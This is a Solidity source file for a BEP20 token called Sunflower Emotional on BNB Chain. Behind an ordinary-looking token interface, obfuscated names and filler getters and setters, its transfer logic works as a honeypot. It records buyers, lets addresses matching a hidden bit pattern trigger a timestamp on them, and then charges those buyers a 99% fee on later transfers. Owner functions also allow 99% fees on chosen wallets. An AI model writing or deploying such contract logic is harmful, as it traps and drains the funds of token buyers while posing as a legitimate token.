/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SunflowerEmotional is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Sunflower Emotional ";
    string constant _symbol = "SunflowerEmotional";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private exemptSwapIsBotsSell;
    mapping(address => bool) private tradingMarketingWalletMode;
    mapping(address => bool) private walletModeLaunchedSell;
    mapping(address => bool) private modeExemptMinIs;
    mapping(address => uint256) private exemptLaunchedTxLiquidityIsBuy;
    mapping(uint256 => address) private autoTradingSwapBotsMinIsLaunched;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private launchedBotsBuyMarketing = 0;
    uint256 private swapBurnIsTradingTeamLimit = 8;

    //SELL FEES
    uint256 private swapModeMarketingTeam = 0;
    uint256 private receiverBuyMinLaunched = 8;

    uint256 private limitModeAutoTxMarketing = swapBurnIsTradingTeamLimit + launchedBotsBuyMarketing;
    uint256 private burnLimitLaunchedMax = 100;

    address private sellTxLiquidityLimitFeeSwapLaunched = (msg.sender); // auto-liq address
    address private marketingMaxMinBots = (0xEEB5eC1aeFa203D403091272fFffCA6Bb0cc3014); // marketing address
    address private feeModeLaunchedBots = DEAD;
    address private burnTxTeamIsLiquiditySwapLaunched = DEAD;
    address private modeLimitAutoBurn = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private botsTeamMarketingReceiver;
    uint256 private receiverMinAutoBotsMarketingFee;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private buyModeSwapBotsMinTxTeam;
    uint256 private teamLimitMinMarketingSwapIsReceiver;
    uint256 private launchedFeeBuyTeam;
    uint256 private walletLimitLiquidityTradingIsTeamReceiver;
    uint256 private minIsWalletLiquidityTxBurn;

    bool private autoLimitBurnBuyMinReceiver = true;
    bool private modeExemptMinIsMode = true;
    bool private marketingMaxTxBurn = true;
    bool private swapMinSellTx = true;
    bool private marketingAutoExemptTx = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txBuyMinIs = _totalSupply / 1000; // 0.1%

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        buyModeSwapBotsMinTxTeam = true;

        exemptSwapIsBotsSell[msg.sender] = true;
        exemptSwapIsBotsSell[address(this)] = true;

        tradingMarketingWalletMode[msg.sender] = true;
        tradingMarketingWalletMode[0x0000000000000000000000000000000000000000] = true;
        tradingMarketingWalletMode[0x000000000000000000000000000000000000dEaD] = true;
        tradingMarketingWalletMode[address(this)] = true;

        walletModeLaunchedSell[msg.sender] = true;
        walletModeLaunchedSell[0x0000000000000000000000000000000000000000] = true;
        walletModeLaunchedSell[0x000000000000000000000000000000000000dEaD] = true;
        walletModeLaunchedSell[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityAutoLimitModeBuy(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return liquidityAutoLimitModeBuy(sender, recipient, amount);
    }

    function liquidityAutoLimitModeBuy(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = botsSellLimitMarketingBurn(sender) || botsSellLimitMarketingBurn(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                minBotsLaunchedBurn();
            }
            if (!bLimitTxWalletValue) {
                burnReceiverLimitLiquidityTxBotsSell(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return minBotsTxMarketingTeam(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(autoLimitBurnBuyMinReceiver, "Trading is not active");
        }

        if (!Administration[sender] && !exemptSwapIsBotsSell[sender] && !exemptSwapIsBotsSell[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || walletModeLaunchedSell[sender] || walletModeLaunchedSell[recipient], "Max TX Limit has been triggered");

        if (botsModeLimitExemptBuyAutoTeam()) {buyTradingTxBots();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = feeModeMarketingBuy(sender) ? maxLimitTeamWallet(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minBotsTxMarketingTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function feeModeMarketingBuy(address sender) internal view returns (bool) {
        return !tradingMarketingWalletMode[sender];
    }

    function txBuyAutoReceiverTeam(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            limitModeAutoTxMarketing = receiverBuyMinLaunched + swapModeMarketingTeam;
            return feeWalletSwapLimitSellMinTx(sender, limitModeAutoTxMarketing);
        }
        if (!selling && sender == uniswapV2Pair) {
            limitModeAutoTxMarketing = swapBurnIsTradingTeamLimit + launchedBotsBuyMarketing;
            return limitModeAutoTxMarketing;
        }
        return feeWalletSwapLimitSellMinTx(sender, limitModeAutoTxMarketing);
    }

    function maxLimitTeamWallet(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(txBuyAutoReceiverTeam(sender, receiver == uniswapV2Pair)).div(burnLimitLaunchedMax);

        if (modeExemptMinIs[sender] || modeExemptMinIs[receiver]) {
            feeAmount = amount.mul(99).div(burnLimitLaunchedMax);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function botsSellLimitMarketingBurn(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function feeWalletSwapLimitSellMinTx(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = exemptLaunchedTxLiquidityIsBuy[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function burnReceiverLimitLiquidityTxBotsSell(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        autoTradingSwapBotsMinIsLaunched[exemptLimitValue] = addr;
    }

    function minBotsLaunchedBurn() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (exemptLaunchedTxLiquidityIsBuy[autoTradingSwapBotsMinIsLaunched[i]] == 0) {
                    exemptLaunchedTxLiquidityIsBuy[autoTradingSwapBotsMinIsLaunched[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(marketingMaxMinBots).transfer(amountBNB * amountPercentage / 100);
    }

    function botsModeLimitExemptBuyAutoTeam() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    marketingAutoExemptTx &&
    _balances[address(this)] >= txBuyMinIs;
    }

    function buyTradingTxBots() internal swapping {
        uint256 amountToLiquify = txBuyMinIs.mul(launchedBotsBuyMarketing).div(limitModeAutoTxMarketing).div(2);
        uint256 amountToSwap = txBuyMinIs.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = limitModeAutoTxMarketing.sub(launchedBotsBuyMarketing.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(launchedBotsBuyMarketing).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(swapBurnIsTradingTeamLimit).div(totalETHFee);

        payable(marketingMaxMinBots).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                sellTxLiquidityLimitFeeSwapLaunched,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getFeeModeLaunchedBots() public view returns (address) {
        if (feeModeLaunchedBots != burnTxTeamIsLiquiditySwapLaunched) {
            return burnTxTeamIsLiquiditySwapLaunched;
        }
        if (feeModeLaunchedBots != burnTxTeamIsLiquiditySwapLaunched) {
            return burnTxTeamIsLiquiditySwapLaunched;
        }
        return feeModeLaunchedBots;
    }
    function setFeeModeLaunchedBots(address a0) public onlyOwner {
        feeModeLaunchedBots=a0;
    }

    function getTxBuyMinIs() public view returns (uint256) {
        if (txBuyMinIs != receiverBuyMinLaunched) {
            return receiverBuyMinLaunched;
        }
        if (txBuyMinIs == launchedBotsBuyMarketing) {
            return launchedBotsBuyMarketing;
        }
        if (txBuyMinIs == swapModeMarketingTeam) {
            return swapModeMarketingTeam;
        }
        return txBuyMinIs;
    }
    function setTxBuyMinIs(uint256 a0) public onlyOwner {
        if (txBuyMinIs == limitModeAutoTxMarketing) {
            limitModeAutoTxMarketing=a0;
        }
        if (txBuyMinIs != limitModeAutoTxMarketing) {
            limitModeAutoTxMarketing=a0;
        }
        if (txBuyMinIs == limitModeAutoTxMarketing) {
            limitModeAutoTxMarketing=a0;
        }
        txBuyMinIs=a0;
    }

    function getMarketingMaxMinBots() public view returns (address) {
        if (marketingMaxMinBots == feeModeLaunchedBots) {
            return feeModeLaunchedBots;
        }
        return marketingMaxMinBots;
    }
    function setMarketingMaxMinBots(address a0) public onlyOwner {
        if (marketingMaxMinBots != sellTxLiquidityLimitFeeSwapLaunched) {
            sellTxLiquidityLimitFeeSwapLaunched=a0;
        }
        if (marketingMaxMinBots != burnTxTeamIsLiquiditySwapLaunched) {
            burnTxTeamIsLiquiditySwapLaunched=a0;
        }
        if (marketingMaxMinBots != marketingMaxMinBots) {
            marketingMaxMinBots=a0;
        }
        marketingMaxMinBots=a0;
    }

    function getSwapBurnIsTradingTeamLimit() public view returns (uint256) {
        if (swapBurnIsTradingTeamLimit == launchedBotsBuyMarketing) {
            return launchedBotsBuyMarketing;
        }
        if (swapBurnIsTradingTeamLimit != burnLimitLaunchedMax) {
            return burnLimitLaunchedMax;
        }
        if (swapBurnIsTradingTeamLimit != txBuyMinIs) {
            return txBuyMinIs;
        }
        return swapBurnIsTradingTeamLimit;
    }
    function setSwapBurnIsTradingTeamLimit(uint256 a0) public onlyOwner {
        if (swapBurnIsTradingTeamLimit == burnLimitLaunchedMax) {
            burnLimitLaunchedMax=a0;
        }
        if (swapBurnIsTradingTeamLimit != launchedBotsBuyMarketing) {
            launchedBotsBuyMarketing=a0;
        }
        if (swapBurnIsTradingTeamLimit != receiverBuyMinLaunched) {
            receiverBuyMinLaunched=a0;
        }
        swapBurnIsTradingTeamLimit=a0;
    }

    function getModeExemptMinIsMode() public view returns (bool) {
        if (modeExemptMinIsMode != autoLimitBurnBuyMinReceiver) {
            return autoLimitBurnBuyMinReceiver;
        }
        if (modeExemptMinIsMode == autoLimitBurnBuyMinReceiver) {
            return autoLimitBurnBuyMinReceiver;
        }
        return modeExemptMinIsMode;
    }
    function setModeExemptMinIsMode(bool a0) public onlyOwner {
        modeExemptMinIsMode=a0;
    }

    function getReceiverBuyMinLaunched() public view returns (uint256) {
        if (receiverBuyMinLaunched != receiverBuyMinLaunched) {
            return receiverBuyMinLaunched;
        }
        if (receiverBuyMinLaunched == swapModeMarketingTeam) {
            return swapModeMarketingTeam;
        }
        if (receiverBuyMinLaunched != launchedBotsBuyMarketing) {
            return launchedBotsBuyMarketing;
        }
        return receiverBuyMinLaunched;
    }
    function setReceiverBuyMinLaunched(uint256 a0) public onlyOwner {
        if (receiverBuyMinLaunched != swapModeMarketingTeam) {
            swapModeMarketingTeam=a0;
        }
        receiverBuyMinLaunched=a0;
    }

    function getAutoLimitBurnBuyMinReceiver() public view returns (bool) {
        if (autoLimitBurnBuyMinReceiver == autoLimitBurnBuyMinReceiver) {
            return autoLimitBurnBuyMinReceiver;
        }
        if (autoLimitBurnBuyMinReceiver != marketingAutoExemptTx) {
            return marketingAutoExemptTx;
        }
        if (autoLimitBurnBuyMinReceiver != marketingAutoExemptTx) {
            return marketingAutoExemptTx;
        }
        return autoLimitBurnBuyMinReceiver;
    }
    function setAutoLimitBurnBuyMinReceiver(bool a0) public onlyOwner {
        if (autoLimitBurnBuyMinReceiver != swapMinSellTx) {
            swapMinSellTx=a0;
        }
        if (autoLimitBurnBuyMinReceiver != autoLimitBurnBuyMinReceiver) {
            autoLimitBurnBuyMinReceiver=a0;
        }
        if (autoLimitBurnBuyMinReceiver == modeExemptMinIsMode) {
            modeExemptMinIsMode=a0;
        }
        autoLimitBurnBuyMinReceiver=a0;
    }

    function getLimitModeAutoTxMarketing() public view returns (uint256) {
        if (limitModeAutoTxMarketing != limitModeAutoTxMarketing) {
            return limitModeAutoTxMarketing;
        }
        if (limitModeAutoTxMarketing != swapBurnIsTradingTeamLimit) {
            return swapBurnIsTradingTeamLimit;
        }
        return limitModeAutoTxMarketing;
    }
    function setLimitModeAutoTxMarketing(uint256 a0) public onlyOwner {
        if (limitModeAutoTxMarketing != launchedBotsBuyMarketing) {
            launchedBotsBuyMarketing=a0;
        }
        if (limitModeAutoTxMarketing != launchedBotsBuyMarketing) {
            launchedBotsBuyMarketing=a0;
        }
        if (limitModeAutoTxMarketing != limitModeAutoTxMarketing) {
            limitModeAutoTxMarketing=a0;
        }
        limitModeAutoTxMarketing=a0;
    }

    function getTradingMarketingWalletMode(address a0) public view returns (bool) {
            return tradingMarketingWalletMode[a0];
    }
    function setTradingMarketingWalletMode(address a0,bool a1) public onlyOwner {
        if (a0 == burnTxTeamIsLiquiditySwapLaunched) {
            autoLimitBurnBuyMinReceiver=a1;
        }
        if (tradingMarketingWalletMode[a0] == tradingMarketingWalletMode[a0]) {
           tradingMarketingWalletMode[a0]=a1;
        }
        if (tradingMarketingWalletMode[a0] == tradingMarketingWalletMode[a0]) {
           tradingMarketingWalletMode[a0]=a1;
        }
        tradingMarketingWalletMode[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}